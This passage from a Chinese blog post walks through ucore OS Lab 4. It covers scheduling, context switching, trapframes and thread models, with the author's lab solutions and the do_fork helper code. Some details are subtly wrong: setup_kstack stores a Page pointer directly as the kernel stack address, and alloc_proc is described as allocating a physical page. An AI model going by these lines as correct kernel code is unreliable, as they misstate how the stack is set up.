遍历整个进程链表,直到找出处于就绪状态的进程(准备将其调度) */</span></span><br><span class="line">            <span class="keyword">if</span> ((le = list_next(le)) != &amp;proc_list) &#123;</span><br><span class="line">                next = le2proc(le, list_link); <span class="comment">/* 根据链表信息获取该进程的物理地址 */</span></span><br><span class="line">                <span class="keyword">if</span> (next-&gt;state == PROC_RUNNABLE) &#123;</span><br><span class="line">                    <span class="comment">/* 如果是&quot;就绪/运行状态&quot;直接break,进入后续操作 */</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (le != last);</span><br><span class="line">        <span class="keyword">if</span> (next == <span class="literal">NULL</span> || next-&gt;state != PROC_RUNNABLE) &#123;</span><br><span class="line">            next = idleproc; <span class="comment">/* 判断将要被调度的进程为空闲进程 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        next-&gt;runs ++; <span class="comment">/* 目标进程被调度的次数增加 */</span></span><br><span class="line">        <span class="keyword">if</span> (next != current) &#123; </span><br><span class="line">            <span class="comment">/* 如果调度进程不是当前进程,则运行proc_run,否则会重新进入空闲进程(循环) */</span></span><br><span class="line">            proc_run(next); <span class="comment">/* 执行进程调度操作 */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>proc_run</code> 函数会设置TSS中ring0的内核栈地址，同时还会加载页目录表的地址，等到这些前置操作完成后，最后执行上下文切换</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_run</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (proc != current) &#123; <span class="comment">/* 再次检查(调度进程,不能等于当前进程) */</span></span><br><span class="line">        <span class="keyword">bool</span> intr_flag;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">prev</span> =</span> current, *next = proc;</span><br><span class="line">        local_intr_save(intr_flag); <span class="comment">/* 阻塞中断 */</span></span><br><span class="line">        &#123;</span><br><span class="line">            current = proc; <span class="comment">/* 设置当前执行的进程 */</span></span><br><span class="line">            load_esp0(next-&gt;kstack + KSTACKSIZE); <span class="comment">/* 设置ring0的内核栈地址 */</span></span><br><span class="line">            lcr3(next-&gt;cr3); <span class="comment">/* 加载页目录表 */</span></span><br><span class="line">            switch_to(&amp;(prev-&gt;context), &amp;(next-&gt;context)); <span class="comment">/* 切换上下文(汇编) */</span></span><br><span class="line">        &#125;</span><br><span class="line">        local_intr_restore(intr_flag); <span class="comment">/* 解除中断的阻塞 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>PS：线程控制块</strong>（Thread Control Block，TCB）</p>
<ul>
<li>线程控制块（TCB）是与进程的控制块（PCB）相似的子控制块，只是TCB中所保存的线程状态比PCB中保存少而已</li>
</ul>
<img src="/2022/04/19/Ucore-Lab4/1650201734801-1651324459312.png" class width="1650201734801"> 
<h2 id="进程终止"><a href="#进程终止" class="headerlink" title="进程终止"></a>进程终止</h2><p><strong>有序终止</strong>：进程结束时调用 <code>exit()</code>，完成进程资源回收</p>
<ul>
<li><code>exit</code> 函数调用的功能：<ul>
<li>将调用参数作为进程的“结果”</li>
<li>关闭所有打开的文件等占用资源</li>
<li>释放内存</li>
<li>释放大部分进程相关的内核数据结构</li>
<li>检查父进程是否存活<ul>
<li>如果存活，则保留结果的值，直到父进程使用，同时当前进程进入僵尸状态</li>
<li>如果没有，它将释放所有的数据结构，进程结束</li>
</ul>
</li>
<li>清理所有等待的僵尸进程（僵尸状态，终止状态）</li>
</ul>
</li>
</ul>
<h2 id="进程机制"><a href="#进程机制" class="headerlink" title="进程机制"></a>进程机制</h2><p>这里我将简述一下 ucore 的进程是什么实现的：（涉及多进程原理）</p>
<ul>
<li>内核的第一个进程 <code>idleproc</code>（空闲进程）会执行 <code>cpu_idle</code>函数，在这个函数中循环执行 <code>schedule</code> 用于空闲进程的调度，这个函数是永远不会停止的</li>
<li>其他的进程都会因为<code>schedule</code> 而被调度，又会因为各种原因被中断，然后再次调度</li>
<li>CPU 会把自己的资源依靠某种算法给分配到这些进程上，每次对于一个进程只执行一小会儿（用定时器timer实现），然后去执行其他的进程</li>
<li>从用户的视角来看，就好像这些进程是“同步运行”的一样，这就是操作系统提供的“抽象”</li>
</ul>
<h2 id="中断帧"><a href="#中断帧" class="headerlink" title="中断帧"></a>中断帧</h2><p>中断发生时：内核将进程的所有寄存器的值放到了进程的 trapframe 结构中</p>
<p>trapframe 保存的都是一些系统关键的寄存器，这里我们只需要特别关注4个寄存器（涉及到程序执行的控制流问题）：</p>
<ul>
<li>EFLAGS：状态寄存器（本实验暂时用不到）</li>
<li>EIP：Instruction Pointer，当前执行的汇编指令的地址</li>
<li>ESP：当前的栈顶</li>
<li>EBP：当前的栈底，当前过程的帧在栈中的开始地址(高地址) </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">/* below here defined by x86 hardware */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">/* below here only when crossing rings, such as from user to kernel */</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<h2 id="用户线程与内核线程"><a href="#用户线程与内核线程" class="headerlink" title="用户线程与内核线程"></a>用户线程与内核线程</h2><p>线程有三种实现方式</p>
<ul>
<li>用户线程：在用户空间实现（POSIX Pthread）<ul>
<li>用户线程的定义：<ul>
<li>用户线程是由一组用户级的线程库函数来完成线程的管理，包括线程的创建、终止、同步和调度等</li>
</ul>
</li>
<li>用户线程的特征：<ul>
<li>不依赖于操作系统内核，在用户空间实现线程机制<ul>
<li>可用于不支持线程的多进程操作系统</li>
<li>线程控制模块（TCB）由线程库函数内部维护</li>
</ul>
</li>
<li>同一个进程内的用户线程切换速度块，无需用户态/核心态切换</li>
<li>允许每个进程拥有自己的线程调度算法</li>
</ul>
</li>
<li>用户进程的缺点：<ul>
<li>线程发起系统调用而阻塞时，整个进程都会进入等待状态</li>
<li>不支持基于线程的处理机抢占</li>
<li>只能按进程分配CPU时间</li>
</ul>
</li>
</ul>
</li>
<li>内核线程：在内核中实现（Windows，Linux）<ul>
<li>内核线程的定义：<ul>
<li>内核线程是由内核通过系统调用实现的线程机制，由内核完成线程的创建、终止和管理</li>
</ul>
</li>
<li>内核线程的特征：<ul>
<li>由内核自己维护PCB和TCB</li>
<li>线程执行系统调用而被阻塞不影响其他线程</li>
<li>线程的创建、终止和切换消耗相对较大</li>
<li>以线程为单位进行CPU时间分配，其中多线程进程可以获得更多的CPU时间</li>
</ul>
</li>
</ul>
</li>
<li>轻权进程：轻权进程是操作系统内核支持的用户线程<ul>
<li>轻权进程的特点：<ul>
<li>用户线程可以自定义调度算法，但存在部分缺点</li>
<li>而内核线程不存在用户线程的各种缺点</li>
<li>所以轻权进程是用户线程与内核线程的结合产物</li>
</ul>
</li>
<li>轻权进程的模型图：</li>
</ul>
</li>
</ul>
<img src="/2022/04/19/Ucore-Lab4/1650201455136-1651324459313.png" class width="1650201455136"> 
<h2 id="练习0-把-lab3-的内容复制粘贴到-lab4"><a href="#练习0-把-lab3-的内容复制粘贴到-lab4" class="headerlink" title="练习0-把 lab3 的内容复制粘贴到 lab4"></a>练习0-把 lab3 的内容复制粘贴到 lab4</h2><h2 id="练习1-分配并初始化一个进程控制块"><a href="#练习1-分配并初始化一个进程控制块" class="headerlink" title="练习1-分配并初始化一个进程控制块"></a>练习1-分配并初始化一个进程控制块</h2><p>alloc_proc 函数负责分配并返回一个新的 struct proc_struct 结构，用于存储新建立的内核线程的管理信息，ucore 需要对这个结构进行最基本的初始化，你需要完成这个初始化过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//LAB4:EXERCISE1 YOUR CODE</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * below fields in proc_struct need to be initialized</span></span><br><span class="line"><span class="comment">     *       enum proc_state state;	       // Process state</span></span><br><span class="line"><span class="comment">     *       int pid;                      // Process ID</span></span><br><span class="line"><span class="comment">     *       int runs;                     // the running times of Proces</span></span><br><span class="line"><span class="comment">     *       uintptr_t kstack;             // Process kernel stack</span></span><br><span class="line"><span class="comment">     *       volatile bool need_resched;   // bool value: need to be rescheduled to release CPU?</span></span><br><span class="line"><span class="comment">     *       struct proc_struct *parent;   // the parent process</span></span><br><span class="line"><span class="comment">     *       struct mm_struct *mm;         // Process&#x27;s memory management field</span></span><br><span class="line"><span class="comment">     *       struct context context;       // Switch here to run process</span></span><br><span class="line"><span class="comment">     *       struct trapframe *tf;         // Trap frame for current interrupt</span></span><br><span class="line"><span class="comment">     *       uintptr_t cr3;                // CR3 register: the base addr of Page Directroy Table(PDT)</span></span><br><span class="line"><span class="comment">     *       uint32_t flags;               // Process flag</span></span><br><span class="line"><span class="comment">     *       char name[PROC_NAME_LEN + 1]; // Process name</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数的关键就是初始化一个 proc_struct 结构体：</p>
<ul>
<li>首先需要知道 proc_struct 结构体的内容</li>
<li>然后需要明白它的各个条目该初始化为什么</li>
</ul>
<p>下面是实现的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;state = PROC_UNINIT;			<span class="comment">// 进程所处状态-未初始化的</span></span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;					   <span class="comment">// 进程的PID为&quot;-1&quot;</span></span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;					   <span class="comment">// 进程的运行时间为0</span></span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;			    <span class="comment">// 该进程不需要被CPU调度</span></span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;			    <span class="comment">// 页目录为内核页目录表的基址</span></span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实，具体的操作流程需要看后续的代码是怎么安排的，我为了省事就直接抄答案了</p>
<ul>
<li><code>context</code>是进程的上下文：用于进程的上下文切换</li>
<li><code>*tf</code> 是中断帧指针：总是指向内核栈的某个位置 <ul>
<li>当进程从用户空间跳到内核空间时，中断帧记录了进程在被中断前的状态</li>
<li>当内核需要跳回用户空间时，需要调整中断帧以恢复让进程继续执行的各寄存器值</li>
<li><code>trapframe</code> 包含了 <code>context</code> 的信息</li>
</ul>
</li>
</ul>
<h2 id="练习2-为新创建的内核线程分配资源"><a href="#练习2-为新创建的内核线程分配资源" class="headerlink" title="练习2-为新创建的内核线程分配资源"></a>练习2-为新创建的内核线程分配资源</h2><p><code>do_fork</code> 的作用是，创建当前内核线程的一个副本，它们的执行上下文、代码、数据都一样，但是存储位置不同，在这个过程中，需要给新内核线程分配资源，并且复制原进程的状态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_fork</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_FREE_PROC;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (nr_process &gt;= MAX_PROCESS) &#123;</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="comment">/* &lt;-------- start --------&gt; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* &lt;-------- end --------&gt; */</span> </span><br><span class="line">fork_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">bad_fork_cleanup_kstack:</span><br><span class="line">    put_kstack(proc);</span><br><span class="line">bad_fork_cleanup_proc:</span><br><span class="line">    kfree(proc);</span><br><span class="line">    <span class="keyword">goto</span> fork_out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求：</p>
<ul>
<li>调用 alloc_proc 来分配一个 proc_struct</li>
<li>调用 setup_kstack 为子进程分配内核堆栈</li>
<li>根据 clone_flag 调用 copy_mm 或 share mm</li>
<li>调用 copy_thread 在 proc_struct 中设置中断帧指针和上下文</li>
<li>将 proc_struct 插入 hash_list和proc_list</li>
<li>调用 wakeup_proc 使新的子进程可以运行</li>
<li>使用子进程的 pid 设置 ret vaule</li>
</ul>
<p>我们可用的函数：</p>
<ul>
<li>alloc_proc：分配一张物理页</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct proc_struct *</span></span><br><span class="line"><span class="function"><span class="title">alloc_proc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> =</span> kmalloc(<span class="keyword">sizeof</span>(struct proc_struct));</span><br><span class="line">    <span class="comment">/* kmalloc:分配连续的物理地址,用于小内存分配 */</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123; <span class="comment">/* 初始化各个参数(和“练习1”的代码一样) */</span></span><br><span class="line">        proc-&gt;state = PROC_UNINIT; </span><br><span class="line">        proc-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">        proc-&gt;runs = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;kstack = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;mm = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;(proc-&gt;context), <span class="number">0</span>, <span class="keyword">sizeof</span>(struct context));</span><br><span class="line">        proc-&gt;tf = <span class="literal">NULL</span>;</span><br><span class="line">        proc-&gt;cr3 = boot_cr3;</span><br><span class="line">        proc-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(proc-&gt;name, <span class="number">0</span>, PROC_NAME_LEN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>setup_kstack：将大小为 KSTACKPAGE 的页面作为进程内核堆栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KSTACKPAGE          2                           </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">setup_kstack</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> alloc_pages(KSTACKPAGE); <span class="comment">/* 分配两张物理页 */</span></span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        proc-&gt;kstack = (<span class="keyword">uintptr_t</span>)(page); <span class="comment">/* proc_struct-&gt;kstack:内核栈 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -E_NO_MEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>copy_mm：把所有的虚拟页数据复制到新的进程（本实验中没有任何作用）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copy_mm</span><span class="params">(<span class="keyword">uint32_t</span> clone_flags, struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(current-&gt;mm == <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* do nothing in this project */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>copy_thread：在进程的内核堆栈顶部设置 trapframe，并设置进程的内核入口点和堆栈</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">copy_thread</span><span class="params">(struct proc_struct *proc, <span class="keyword">uintptr_t</span> esp, struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    proc-&gt;tf = (struct trapframe *)(proc-&gt;kstack + KSTACKSIZE) - <span class="number">1</span>;</span><br><span class="line">    *(proc-&gt;tf) = *tf;</span><br><span class="line">    proc-&gt;tf-&gt;tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    proc-&gt;tf-&gt;tf_esp = esp;</span><br><span class="line">    proc-&gt;tf-&gt;tf_eflags |= FL_IF;</span><br><span class="line"></span><br><span class="line">    proc-&gt;context.eip = (<span class="keyword">uintptr_t</span>)forkret;</span><br><span class="line">    proc-&gt;context.esp = (<span class="keyword">uintptr_t</span>)(proc-&gt;tf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>hash_proc：将 proc 添加到进程哈希链表中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HASH_SHIFT          10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pid_hashfn(x)       (hash32(x, HASH_SHIFT))</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> hash_list[HASH_LIST_SIZE]; <span class="comment">/* 进程哈希链表的入口地址 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">hash_proc</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    list_add(hash_list + pid_hashfn(proc-&gt;pid), &amp;(proc-&gt;hash_link));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>get_pid：为进程分配唯一的PID</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PROCESS                 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PID                     (MAX_PROCESS * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">get_pid</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static_assert</span>(MAX_PID &gt; MAX_PROCESS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span>;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *<span class="built_in">list</span> = &amp;proc_list, *le; <span class="comment">/* 设置*prev和*next */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> next_safe = MAX_PID, last_pid = MAX_PID;</span><br><span class="line">    <span class="keyword">if</span> (++ last_pid &gt;= MAX_PID) &#123; </span><br><span class="line">        last_pid = <span class="number">1</span>; <span class="comment">/* 讲真没有看懂这里有啥意义 */</span></span><br><span class="line">        <span class="keyword">goto</span> inside;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (last_pid &gt;= next_safe) &#123;</span><br><span class="line">    inside:</span><br><span class="line">        next_safe = MAX_PID;</span><br><span class="line">    repeat:</span><br><span class="line">        le = <span class="built_in">list</span>; <span class="comment">/* 初始le为哈希进程链表入口 */</span></span><br><span class="line">        <span class="keyword">while</span> ((le = list_next(le)) != <span class="built_in">list</span>) &#123; <span class="comment">/* 遍历哈希进程链表 */</span></span><br><span class="line">            proc = le2proc(le, list_link); <span class="comment">/* 根据链表信息获取进程地址 */</span></span><br><span class="line">            <span class="keyword">if</span> (proc-&gt;pid == last_pid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (++ last_pid &gt;= next_safe) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (last_pid &gt;= MAX_PID) &#123;</span><br><span class="line">                        last_pid = <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    next_safe = MAX_PID;</span><br><span class="line">                    <span class="keyword">goto</span> repeat;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (proc-&gt;pid &gt; last_pid &amp;&amp; next_safe &gt; proc-&gt;pid) &#123;</span><br><span class="line">                next_safe = proc-&gt;pid;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> last_pid; <span class="comment">/* 返回一个不重复的pid */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>wakeup_proc：设置 proc-&gt;state = PROC_RUNNABLE（程序可运行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wakeup_proc</span><span class="params">(struct proc_struct *proc)</span> </span>&#123;</span><br><span class="line">    assert(proc-&gt;state != PROC_ZOMBIE &amp;&amp; proc-&gt;state != PROC_RUNNABLE);</span><br><span class="line">    proc-&gt;state = PROC_RUNNABLE; <span class="comment">/* 程序可运行 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实现过程：</p>
